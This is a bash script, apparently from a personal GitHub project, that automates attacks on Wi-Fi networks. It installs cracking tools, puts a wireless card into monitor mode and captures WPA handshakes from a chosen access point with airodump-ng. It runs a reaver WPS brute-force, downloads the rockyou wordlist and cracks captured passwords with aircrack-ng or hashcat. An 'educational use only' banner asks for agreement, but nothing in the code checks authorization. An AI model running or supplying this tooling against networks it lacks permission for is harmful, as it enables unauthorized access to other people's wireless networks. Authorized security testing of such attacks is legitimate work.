#!/bin/bash

# Coded by Ahmed Noaman
# email: an758592@gmail.com
# github: https://github.com/an758592/WIFI

echo "██  ██  ██  ██████  ██████████"
echo "██  ██  ██    ██    ██      ██"
echo "██  ██  ██    ██    ████    ██"
echo "██  ██  ██    ██    ██      ██"
echo "██████████  ██████  ██    ████"

echo "By using the WIFI.sh script you agree to the following terms and conditions:"
echo "1-Usage: The script is for educational and testing purposes only, and users must have the necessary permissions for security testing on wireless networks."
echo "2-Responsibility: Users are solely responsible for their actions using the script, including compliance with laws and regulations."
echo "3-No Warranty: The script is provided as is, without any warranties."
echo "4-No Liability: The author of the script are not liable for damages arising from its use."
echo "5-Ethical Use: Users agree to use the script ethically and responsibly, obtaining proper authorization before testing networks."
echo "6-Compliance: Users agree to comply with all applicable laws, regulations, and ethical guidelines."
echo "7-Indemnification: Users agree to indemnify the author from any claims arising from their use of the script."
echo "8-Modification: Users may modify the script for personal use but may not distribute modified versions without permission."
echo "9-Termination: The author reserve the right to terminate or suspend access to the script without notice."
echo "10-Acceptance: By using the script, users acknowledge and agree to these terms and conditions."

read -p "Do you agree with these terms? [y=YES-continue/n=NO-exit] : " terms

if [ "$terms" != y ]; then
    echo "You are not authorized to use the Script."
    exit
fi

clear

if [ "$(id -u)" != 0 ]; then
    echo "Run the script as root or use sudo, and try again."
    exit
fi

if [ -f /etc/os-release ]; then
    source /etc/os-release
    distribution="$ID"
elif [ -f /etc/lsb-release ]; then
    source /etc/lsb-release
    distribution="$DISTRIB_ID"
fi

required_tools=("aircrack-ng" "reaver" "ifconfig" "wget" "hcxtools" "hashcat")

for tool in "${required_tools[@]}"; do
    if ! command -v "$tool"; then
        if [ "$distribution" = Ubuntu ] || [ "$distribution" = kali ] || [ "$distribution" = debian ]; then
            apt-get update -y
            apt-get install "$tool" -y
        elif [ "$distribution" = fedora ]; then
            dnf update -y
            dnf install "$tool" -y
        else
            echo "Install '$tool', and try again."
            exit
        fi
    fi
done

clear

ifconfig

read -p "Enter the interface [default=wlan0] : " interface
interface=${interface:-wlan0}

read -p "Enter the path and name to save the capfile [default=/root/] : " cap
cap=${cap:-/root/}

read -p "Did you want to dawnload rockyou.txt dictionary file? [1=dawnload-it/2=already-have-it/3=use-another-wordlist] : " rockyou

if [ "$rockyou" = 1 ]; then
    mkdir /usr/share/wordlists/
    wget -O /usr/share/wordlists/ https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
    wordlist="/usr/share/wordlists/rockyou.txt"
elif [ "$rockyou" = 2 ]; then
    wordlist="/usr/share/wordlists/rockyou.txt"
elif [ "$rockyou" = 3 ]; then
    read -p "Enter the path to the wordlist : " wordlist
    wordlist=${wordlist:-/usr/share/wordlists/rockyou.txt}
fi

airmon-ng check kill
airmon-ng start "$interface"

clear

read -p "Enter the mode number [1=scan-ONE/2=scan-ALL/3=WPS-attack] : " mode

if [ "$mode" = 1 ]; then
    airodump-ng --wps "$interface"mon
    read -p "Enter the AP MAC [TARGET] : " amac
    read -p "Enter the channel number [1:13] : " channel
    airodump-ng -c "$channel" --bssid "$amac" --output-format pcap --wps -w "$cap" "$interface"mon
elif [ "$mode" = 2 ]; then
    airodump-ng --output-format pcap --wps -w "$cap" "$interface"mon
elif [ "$mode" = 3 ]; then
    airodump-ng --wps "$interface"mon
    read -p "Enter the AP MAC [TARGET] : " amac
    read -p "Enter the channel number [1:13] : " channel
    reaver -L -N -i "$interface"mon -c "$channel" -b "$amac" -vv
else
    airmon-ng stop "$interface"mon
    service NetworkManager restart
    exit
fi

clear

read -p "Start password cracking with [1=aircrack-ng/2=hashcat] : " crack

if [ "$crack" = 1 ]; then
    airmon-ng stop "$interface"mon
    service NetworkManager restart
    aircrack-ng -w "$wordlist" "$cap"-01.cap
elif [ "$crack" = 2 ]; then
    airmon-ng stop "$interface"mon
    service NetworkManager restart
    hcxpcapngtool -o "$cap".22000 "$cap"-01.cap
    hashcat -m 22000 "$cap".22000 "$wordlist"
else
    airmon-ng stop "$interface"mon
    service NetworkManager restart
    exit
fi
